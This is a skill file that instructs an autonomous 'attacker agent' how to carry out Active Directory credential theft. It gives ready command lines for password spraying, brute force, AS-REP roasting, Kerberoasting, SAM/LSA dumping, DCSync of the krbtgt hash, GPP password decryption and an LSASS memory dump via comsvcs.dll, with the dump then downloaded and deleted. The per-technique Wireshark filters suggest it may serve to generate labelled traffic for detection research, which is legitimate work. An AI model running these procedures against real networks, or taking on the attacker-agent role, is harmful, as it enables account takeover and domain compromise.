---
name: ad-credential
description: Credential-access Active Directory skill for an attacker agent on a domain-joined Windows host. Covers password spray/brute, AS-REP and Kerberoasting, secretsdump/DCSync, GPP, and LSASS dump. Load this skill when the task names ad-credential. Scripts and state.json live in the shared ad-attack skill. Every task must write a display-filter-only {task_id}.txt via write_filter.py.
---

# AD Credential Access Skill

Load this skill **only** when the dispatched task names `ad-credential`. Do not load other phase catalogs.

**Shared runtime.** `cd` to `~/.config/opencode/skills/ad-attack` (or the packaged `attacker/skills/ad-attack`) before any `python scripts/...` call. Follow the Mandatory Execution Protocol in the `ad-attack` skill, including Step 5 (write `{task_id}.txt`).

**Traffic filter contract.** Time-window slicing is a later extract step. This skill writes **only** a Wireshark display filter — never a tshark command, never `frame.time_epoch`. Host-local techniques with no packets use `frame.number == 0`.

# Phase 2: Credential Access

## 2.1 Password Spraying

- Technique id: `credential.password-spray`
- ATT&CK: T1110.003 (Brute Force: Password Spraying)

Purpose: test a single password against many accounts.

Inputs: `wordlists.usernames` (user list), `domain.name`, `domain.dc_ip`, and a candidate password (from `wordlists.passwords` or a single candidate in the task text).

Procedure (one atomic action):

```
kerbrute passwordspray -d <domain.name> --dc <domain.dc_ip> <userlist> <password>
```

Outputs: for each valid credential found, add a user object:

```
python scripts/state.py add users '{"username": "<user>", "password": "<password>", "source": "credential.password-spray"}'
```

Rollback: if a sprayed credential is later rejected, `mark-stale` the user object and re-spray or re-enumerate that account.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (kerberos || tcp.port == 88 || udp.port == 88)
```


## 2.2 Single-Account Brute Force
- Technique id: `credential.brute-user`
- ATT&CK: T1110.001 (Brute Force: Password Guessing)

Purpose: brute-force a single account against a password list.

Inputs: a single username (from `domain.usernames`), `wordlists.passwords` (password list), `domain.name`, `domain.dc_ip`.

Procedure (one atomic action):

```
kerbrute bruteuser -d <domain.name> --dc <domain.dc_ip> <passlist> <user>
```

Outputs: add a user object for a valid credential:

```
python scripts/state.py add users '{"username": "<user>", "password": "<password>", "source": "credential.brute-user"}'
```

Rollback: if a credential is later rejected, `mark-stale` the user object and re-enumerate.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (kerberos || tcp.port == 88 || udp.port == 88)
```


## 2.3 Brute Force
- Technique id: `credential.brute-force`
- ATT&CK: T1110 (Brute Force)

Purpose: brute-force many accounts against a password list.

Inputs: `wordlists.combos` (a `username:password` combo file built from `wordlists.usernames` × `wordlists.passwords`), `domain.name`, `domain.dc_ip`.

Procedure (one atomic action):

```
kerbrute bruteforce -d <domain.name> --dc <domain.dc_ip> <wordlists.combos>
```

`kerbrute bruteforce` accepts exactly one `<user_pw_file>` argument (a combo file of `username:password` pairs, one per line) — not separate passlist + userlist. The combo file is operator-provided in `wordlists.combos`; failed guesses count against the lockout threshold.

Outputs: add a user object for each valid credential:

```
python scripts/state.py add users '{"username": "<user>", "password": "<password>", "source": "credential.brute-force"}'
```

Rollback: if a credential is later rejected, `mark-stale` the user object and re-enumerate.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (kerberos || tcp.port == 88 || udp.port == 88)
```


## 2.4 AS-REP Roasting
- Technique id: `credential.asrep-roast`
- ATT&CK: T1558.004 (Steal or Forge Kerberos Tickets: AS-REP Roasting)

Purpose: request TGTs for accounts without Kerberos preauthentication.

Inputs: `wordlists.usernames` (user list), `domain.name`, `domain.dc_ip`.

Procedure (one atomic action):

```
python -m impacket.examples.GetNPUsers <domain.name>/ -usersfile <userlist> -dc-ip <domain.dc_ip> -format hashcat -outputfile asreproast.txt
```

Outputs: mark affected accounts `no_preauth` and record the output file:

```
python scripts/state.py add users '{"username": "<user>", "no_preauth": true, "source": "credential.asrep-roast"}'
python scripts/state.py add files '{"path": "asreproast.txt", "description": "AS-REP roast output"}'
```

Rollback: if an AS-REP entry fails to crack or is stale, re-run the roast for that user.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (kerberos || tcp.port == 88 || udp.port == 88)
```


## 2.5 Kerberoasting
- Technique id: `credential.kerberoast`
- ATT&CK: T1558.003 (Steal or Forge Kerberos Tickets: Kerberoasting)

Purpose: request service tickets for SPNs and recover service account hashes.

Inputs: a user object with `password` from `users`, plus `domain.dc_ip`.

Procedure (one atomic action):

```
python -m impacket.examples.GetUserSPNs -dc-ip <domain.dc_ip> <domain.name>/<user>:<password> -request
```

Outputs: append discovered SPNs to `domain.spns` and mark the service account:

```
python scripts/state.py add domain.spns '{"spn": "<spn>", "account": "<service-account>"}'
python scripts/state.py add users '{"username": "<service-account>", "spns": ["<spn>"], "is_service_account": true, "source": "credential.kerberoast"}'
```

Rollback: if a stored SPN no longer resolves, `mark-stale` it and re-run Kerberoasting.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (kerberos || ldap || tcp.port == 88 || tcp.port == 389)
```


## 2.6 Credential Dumping (SAM/LSA)
- Technique id: `credential.dump-secrets`
- ATT&CK: T1003 (OS Credential Dumping)

Purpose: dump local account hashes from a host.

Inputs: a user object (use `password` or `ntlm_hash`) from `users`, plus the target host.

Procedure (one atomic action). Use `:<password>` if the object has a plaintext password, or `-hashes :<ntlm-hash>` if only the hash is known:

```
python -m impacket.examples.secretsdump <domain.name>/<user>:<password>@<target-ip>
```

```
python -m impacket.examples.secretsdump -hashes :<ntlm-hash> <domain.name>/<user>@<target-ip>
```

Outputs: append recovered accounts to `users` (set `ntlm_hash`/`kerberos_rc4`, leave `password` empty when only the hash is known) and record logon hosts:

```
python scripts/state.py add users '{"username": "<user>", "ntlm_hash": "<hash>", "kerberos_rc4": "<hash>", "logon_hosts": ["<target-ip>"], "source": "credential.dump-secrets"}'
```

Rollback: if a dumped hash later fails to authenticate, `mark-stale` it and re-dump.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (smb || msrpc || tcp.port == 445 || tcp.port == 135)
```


## 2.7 DCSync
- Technique id: `credential.dcsync`
- ATT&CK: T1003.006 (OS Credential Dumping: DCSync)

Purpose: replicate directory secrets, including the `krbtgt` hash (required for golden tickets).

Inputs: an admin user object with `password`/`ntlm_hash` from `users`.

Procedure (one atomic action):

```
python -m impacket.examples.secretsdump <domain.name>/<admin-user>:<password>@<domain.dc_ip> -just-dc
```

`krbtgt` only (sub-variant of the same command):

```
python -m impacket.examples.secretsdump <domain.name>/<admin-user>:<password>@<domain.dc_ip> -just-dc-user krbtgt
```

Outputs: store the `krbtgt` hash and any new account hashes in `users`, and record the domain SID:

```
python scripts/state.py add users '{"username": "krbtgt", "ntlm_hash": "<hash>", "kerberos_rc4": "<hash>", "source": "credential.dcsync"}'
python scripts/state.py set domain.domain_sid "<domain-sid>"
```

Rollback: if the `krbtgt` hash is suspected stale (rotated), `mark-stale` the `krbtgt` user object and re-run DCSync.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (smb || msrpc || tcp.port == 445 || tcp.port == 135)
```


## 2.8 GPP Password (cPassword)
- Technique id: `credential.gpp-password`
- ATT&CK: T1552.006 (Unsecured Credentials: Group Policy Preferences)

Purpose: decrypt cPassword values from SYSVOL group-policy preference files.

Inputs: `domain.name`, `domain.dc_ip`, and an account with `password` from `users`.

Procedure (one atomic action):

```
python -m impacket.examples.Get-GPPPassword -dc-ip <domain.dc_ip> <domain.name>/<user>:<password>@<domain.dc_fqdn>
```

Outputs: for each decrypted credential, add a user object:

```
python scripts/state.py add users '{"username": "<user>", "password": "<decrypted>", "source": "credential.gpp-password"}'
```

Rollback: if a GPP credential is later rejected, `mark-stale` the user object and re-run this technique.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (smb || tcp.port == 445 || tcp.port == 139)
```


## 2.9 LSASS Memory Dump
- Technique id: `credential.lsass-dump`
- ATT&CK: T1003.001 (OS Credential Dumping: LSASS Memory)

Purpose: dump the LSASS process memory from a compromised host to recover credentials offline.

Inputs: an admin user object with `password` from `users`, plus the target host.

Procedure (one atomic action — locate LSASS, dump via comsvcs.dll, then download):

```
python -m impacket.examples.wmiexec <domain.name>/<user>:<password>@<target-ip> 'powershell -c "Get-Process lsass | Select-Object -ExpandProperty Id"'
python -m impacket.examples.wmiexec <domain.name>/<user>:<password>@<target-ip> 'rundll32 C:\windows\system32\comsvcs.dll, MiniDump <lsass-pid> C:\windows\temp\lsass.dmp full'
```

Download and clean up with `smbclient`: `use C$`, `get windows\temp\lsass.dmp`, then `del windows\temp\lsass.dmp`, `exit`.

Offline parsing is an operator step, not an attack action: `pypykatz lsa minidump lsass.dmp` (or mimikatz `sekurlsa::minidump lsass.dmp; sekurlsa::logonpasswords`).

Outputs:

```
python scripts/state.py add files '{"path": "lsass.dmp", "description": "LSASS memory dump from <target-ip>"}'
```

Rollback: if the dump yields nothing usable, `mark-stale` the file entry and re-dump with a fresh admin credential.


Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (smb || msrpc || tcp.port == 445 || tcp.port == 135)
```

